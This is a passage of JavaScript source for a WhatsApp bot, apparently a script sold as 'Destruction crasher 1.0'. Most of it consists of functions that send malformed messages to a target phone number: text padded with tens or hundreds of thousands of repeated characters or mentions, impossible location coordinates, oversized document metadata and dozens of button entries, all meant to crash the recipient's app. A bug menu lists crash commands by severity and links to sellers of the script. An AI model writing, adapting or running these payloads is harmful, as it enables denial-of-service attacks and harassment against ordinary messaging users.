                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }        
    async function f21(p72, p73, p74 = false, p75 = false) {
      const v168 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 9007199254740991,
        mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
        fileName: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
        fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1723855952",
        contactVcard: true,
        thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
        thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
        thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
        jpegThumbnail: v50
      };
      const v169 = {
        title: "",
        documentMessage: v168,
        hasMediaAttachment: true
      };
      let vGenerateWAMessageFromContent14 = generateWAMessageFromContent(p72, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v169,
              body: {
                text: "𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠̤"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p74 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝕭𝖆𝖙𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌〽️\",\"sections\":[{\"title\":\"𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p72,
        quoted: v93
      });
      await BarzBug.relayMessage(p72, vGenerateWAMessageFromContent14.message, p75 ? {
        participant: {
          jid: p72
        }
      } : {});
      console.log(chalk.green("wait bwang..."));
    }
    async function f22(p76, p77, p78 = false) {
      let vGenerateWAMessageFromContent15 = generateWAMessageFromContent(p76, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "𝐁𝐚𝐫𝐳𝐓𝐡𝐞𝐆𝐞𝐧𝐤𝐳 🌷",
                  address: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                  jpegThumbnail: fs.readFileSync("./lib/image/zkosong.png")
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "𝐁𝐚𝐫𝐳𝐓𝐡𝐞𝐆𝐞𝐧𝐤𝐳 🌷",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                    sections: [{
                      title: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p76,
        quoted: v93
      });
      await BarzBug.relayMessage(p76, vGenerateWAMessageFromContent15.message, p78 ? {
        participant: {
          jid: p76
        }
      } : {});
    }
    ;
    async function ioskeresh(target) {
luvsrusdi.relayMessage(target, {
'extendedTextMessage': {
'text': '.',
'contextInfo': {
'stanzaId': target,
'participant': target,
'quotedMessage': {
							'conversation': '👌👈' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("HAH?JOMOK? SIGMA LU"));
		};
		async function AmbaTukam(target, Ptcp = true) {
  try {
    await BarzBug.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "#ANAKJOMOK🩸🦠\n" + "ꦾ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "SiJomokKenapaJirr",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
		async function Crashed(target) {
BarzBug.relayMessage(
target,
{
interactiveMessage: {
header: {
title: "⃟🩸 𝐖͢𝐲𝐧𝐧𝐳̶͢͠𝐌̾𝐨𝐝̈́ 𝐳🦠⃟   ",
hasMediaAttachment: false
},
body: {
text: "\nꦾ".repeat(155555)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "z"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},

]
}
}						
},
{ participant: { jid: target } }
);
}


    async function f23(p79, p80 = false) {
      await BarzBug.relayMessage(p79, {
        extendedTextMessage: {
          text: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘉𝘢𝘳𝘻 𝘐𝘋\n" + "@6289999999999".repeat(150000),
          contextInfo: {
            mentionedJid: ["6289999999999@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: p79,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: " X "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘉𝘢𝘳𝘻 𝘐𝘐",
              body: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘉𝘢𝘳𝘻 𝘐𝘐",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://call.whatsapp.com/video/5fkKnwookMmakllas",
              mediaUrl: "https://call.whatsapp.com/video/5fkKnwookMmakllas",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://call.whatsapp.com/video/5fkKnwookMmakllas"
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, p80 ? {
        participant: {
          jid: p79
        }
      } : {});
    }
    ;
    async function f24(p81) {
      let v178 = "𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱";
      await BarzBug.relayMessage(p81, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱" + "@zcoder9".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱 "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: p81
        }
      }, {
        messageId: null
      });
    }
    let v183 = [];
    for (let v184 of v43) {
      v183.push({
        displayName: await BarzBug.getName(v184 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await BarzBug.getName(v184 + "@s.whatsapp.net")) + "\n\nFN:" + (await BarzBug.getName(v184 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + v184 + ":" + v184 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: dikaid.tech@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    function f25(p82) {
      return "```" + p82 + "```";
    }
    function f26(p83) {
      var v185 = "";
      var v186 = p83.toString().split("").reverse().join("");
      for (var v187 = 0; v187 < v186.length; v187++) {
        if (v187 % 3 == 0) {
          v185 += v186.substr(v187, 3) + ".";
        }
      }
      return "" + v185.split("", v185.length - 1).reverse().join("");
    }
    try {
      ppuser = await BarzBug.profilePictureUrl(m.sender, "image");
    } catch (_0xc6380f) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    if (!BarzBug.public) {
      if (!m.key.fromMe) {
        return;
      }
    }
    function f27(p84) {
      return p84[Math.floor(Math.random() * p84.length)];
    }
    const v188 = await reSize(ppuser, 300, 300);
    const vF5 = async (p85, p86, p87, p88, p89, p90, p91, p92, p93) => {
      const vGenerateWAMessageFromContent16 = generateWAMessageFromContent(p85, proto.Message.fromObject({
        orderMessage: {
          orderId: p87,
          thumbnail: p88,
          itemCount: p89,
          status: "INQUIRY",
          surface: "CATALOG",
          orderTitle: p90,
          message: p86,
          sellerJid: p91,
          token: p92,
          totalAmount1000: p93,
          totalCurrencyCode: "IDR"
        }
      }), {
        userJid: p85,
        quoted: m
      });
      BarzBug.relayMessage(p85, vGenerateWAMessageFromContent16.message, {
        messageId: vGenerateWAMessageFromContent16.key.id
      });
    };
    const vF6 = p94 => {
      BarzBug.sendMessage(m.chat, {
        text: p94,
        contextInfo: {
          mentionedJid: [v26],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: "𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗 𝚌𝚛𝚊𝚜𝚑𝚎𝚛 𝟷.𝟶",
            body: "𝙱𝚢 𝚞𝚗𝚔𝚗𝚘𝚠𝚗 𝚍𝚎𝚟",
            previewType: "PHOTO",
            thumbnailUrl: "https://cdn.elxyzgpt.xyz/file/SYIGr5seSt.png",
            thumbnail: fs.readFileSync("./lib/image/brutality.jpg"),
            sourceUrl: "" + global.channel
          }
        }
      }, {
        quoted: m
      });
    };
    const v190 = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(v14 ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v192 = {
      key: v190,
      message: {
        contactMessage: {
          displayName: "" + v28,
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:" + v28 + ",\nitem1.TEL;waid=" + v26.split("@")[0] + ":" + v26.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          jpegThumbnail: {
            url: "https://i.ibb.co.com/7yzHFfh/brutality.jpg"
          }
        }
      }
    };
    function f28(p95 = "") {
      return [...p95.matchAll(/@([0-9]{5,16}|0)/g)].map(p96 => p96[1] + "@s.whatsapp.net");
    }
    switch (v20) {
      case "start":
      case "menu":
        {
          let teksnya = `
[𝙳𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗 𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶]

> □ _𝙷𝚒 *${m.
pushName}* 𝚝𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚜𝚌𝚛𝚒𝚙𝚝 ${global.Dec} 𝙾𝚠𝚗𝚎𝚛 𝚘𝚏 𝚂𝚌𝚛𝚒𝚙𝚝 ${global.ownername} 𝚎𝚗𝚓𝚘𝚢 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚞𝚐 <😈>_

✰ 𝚜𝚎𝚕𝚎𝚌𝚝 𝚢𝚘𝚞𝚛 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚖𝚢 𝚕𝚘𝚛𝚍 ✰
✰ ${v18}𝚊𝚌𝚌𝚎𝚜𝚜𝚖𝚎𝚗𝚞 
✰ ${v18}𝚋𝚞𝚐𝚖𝚎𝚗𝚞 
✰${v18}𝚝𝚑𝚊𝚗𝚔𝚜𝚝𝚘 

> 𝙱𝚞𝚢 𝚜𝚌𝚛𝚒𝚙𝚝? 
Whatsapp : 2349060266540
Telegram : t.me/hamsterfanpage
Youtube : @easyhacks`
await BarzBug.sendMessage(m.chat, {
 image : fs.readFileSync("./jwmbut.png"),
 caption: teksnya,
 });
        }
        break;
      case 'thanksto':{
let teksnya = `[𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗 𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶]

> □ _𝙷𝚒 *${m.
pushName}* 𝚃𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚄𝚜𝚒𝚗𝚐 𝚂𝚌𝚛𝚒𝚙𝚝 ${global.Dec} 𝙾𝚠𝚗𝚎𝚛 𝚘𝚏 𝚂𝚌𝚛𝚒𝚙𝚝 ${global.ownername} 𝙴𝚗𝚓𝚘𝚢 𝚞𝚜𝚒𝚗𝚐 𝚋𝚞𝚐 <😈>_

✰ 𝚃𝙷𝙰𝙽𝙺𝚂 𝚃𝙾 ✰
⫸ ${v18}𝚏𝚒𝚛𝚜𝚝 [𝙶𝙾𝙳]
⫸ ${v18}𝚙𝚊𝚛𝚎𝚗𝚝𝚜
⫸ ${v18}𝚋𝚊𝚛𝚣 [𝚙𝚛𝚘𝚐𝚛𝚊𝚖𝚖𝚎𝚛]
⫸ ${v18}𝚎𝚊𝚜𝚢 𝚑𝚊𝚌𝚔𝚜(𝚖𝚢 𝚌𝚑𝚊𝚗𝚗𝚎𝚕) 
⫸ ${v18}𝚞𝚗𝚔𝚗𝚘𝚠𝚗 𝚍𝚎𝚟𝚜 [𝚜𝚞𝚙𝚙𝚘𝚛𝚝]
⫸ ${v18}𝚊𝚢 [𝚝𝚎𝚌𝚑𝚗𝚒𝚌𝚊𝚕 𝚜𝚌𝚛𝚒𝚙𝚝]

> 𝙱𝚞𝚢 𝚜𝚌𝚛𝚒𝚙𝚝? 
Whatsapp : 2349060266540
Telegram : t.me/hamsterfanpage
YouTube : @easyhacks`
await BarzBug.sendMessage(m.chat, {
 image : fs.readFileSync("./jwmbut.png"),
 caption: teksnya,
 });
        }
        break;
      case 'bugmenu':{
let teksnya = `[𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗 𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶]

> □ _𝙷𝚒 *${m.
pushName}* 𝚝𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚄𝚜𝚒𝚗𝚐 𝚂𝚌𝚛𝚒𝚙𝚝 ${global.Dec} 𝙾𝚠𝚗𝚎𝚛 𝚘𝚏 𝚂𝚌𝚛𝚒𝚙𝚝 ${global.ownername} 𝙴𝚗𝚓𝚘𝚢𝚢 𝚄𝚜𝚒𝚗𝚐 𝙱𝚞𝚐 <😈>_

✰ 𝙱𝚄𝙶-𝙼𝙴𝙽𝚄 ✰
✯ 𝙲𝚁𝙰𝚂𝙷𝙴𝚁 𝙱𝚄𝙶 [𝙴𝙰𝚂𝚈]
➢ ${v18}𝚌𝚊𝚕𝚊𝚖𝚒𝚝𝚢
➢ ${v18}𝚙𝚊𝚒𝚗
➢ ${v18}𝚛𝚎𝚜𝚝

✰ 𝙳𝙾𝙾𝙼 𝙱𝚄𝙶𝚂 [𝙼𝙴𝙳𝙸𝚄𝙼]
➢ ${v18}𝚍𝚘𝚘𝚖
➢ ${v18}𝚍𝚒𝚎
➢ ${v18}𝚌𝚛𝚊𝚜𝚑

✰ 𝙽𝙾 𝙻𝙸𝙼𝙸𝚃 𝙱𝚄𝙶𝚂 [𝙷𝙰𝚁𝙳]
➢ ${v18}𝚐𝚘𝚘𝚍-𝚋𝚢𝚎
➢ ${v18}𝚎𝚡𝚒𝚝-𝚠𝚊

< / > 𝚠𝚊𝚛𝚗𝚒𝚗𝚐 𝚍𝚘𝚗𝚝 𝚜𝚙𝚊𝚖 𝚊𝚕𝚕 𝚕𝚎𝚟𝚎𝚕𝚜 𝚘𝚏 𝚋𝚞𝚐𝚜
< / > 𝚙𝚊𝚞𝚜𝚎 𝟻 𝚖𝚒𝚗𝚞𝚝𝚎𝚜 𝚊𝚏𝚝𝚎𝚛 𝚋𝚞𝚐𝚐𝚒𝚗𝚐

> 𝙱𝚞𝚢 𝚂𝚌𝚛𝚒𝚙𝚝? 
Whatsapp : 2349060266540
Telegram : t.me/hamsterfanpage
YouTube : @easyhacks`
await BarzBug.sendMessage(m.chat, {
 image : fs.readFileSync("./jwmbut.png"),
 caption: teksnya,
 });
        }
        break;
      case 'accessmenu':
      case 'aksesmenu':{
let teksnya = `[𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗 𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶]

> □ _𝙷𝚒 *${m.
pushName}* 𝚃𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚄𝚜𝚒𝚗𝚐 𝚂𝚌𝚛𝚒𝚙𝚝 ${global.Dec} 𝙾𝚠𝚗𝚎𝚛 𝚂𝚌𝚛𝚒𝚙𝚝 ${global.ownername} 𝙴𝚗𝚓𝚘𝚢  𝚄𝚜𝚒𝚗𝚐 𝙱𝚞𝚐 <😈>_

✰ 𝙰𝚌𝚌𝚎𝚜𝚜-𝚖𝚎𝚗𝚞 ✰

✰ ${v18}𝚊𝚍𝚍𝚙𝚛𝚎𝚖 

✰ ${v18}𝚍𝚎𝚕𝚙𝚛𝚎𝚖

✰ ${v18}𝚜𝚎𝚕𝚏

✰ ${v18}𝚙𝚞𝚋𝚕𝚒𝚌

> Buying Script? 
Whatsapp : 2349060266540
Telegram : t.me/hamsterfanpage
YouTube : @easyhacks`
await BarzBug.sendMessage(m.chat, {
 image : fs.readFileSync("./jwmbut.png"),
 caption: teksnya,
 });
        }
        break;
      case "zbsbs":
      case "hidetndbsag":
        if (!v46) {
          return vF6(global.onlyown);
        }
        if (!v23) {
          return vF6(global.notext);
        }
        BarzBug.sendMessage(m.chat, {
          text: v23 ? v23 : "",
          mentions: v32.map(p97 => p97.id)
        }, {
          quoted: m
        });
        break;
      case "tagall":
        {
          if (!v46 && !v39) {
            return vF6(global.onlyadmin);
          }
          if (!v24) {
            return joreply(global.onlygroup);
          }
          if (!q) {
            return vF6(global.notext);
          }
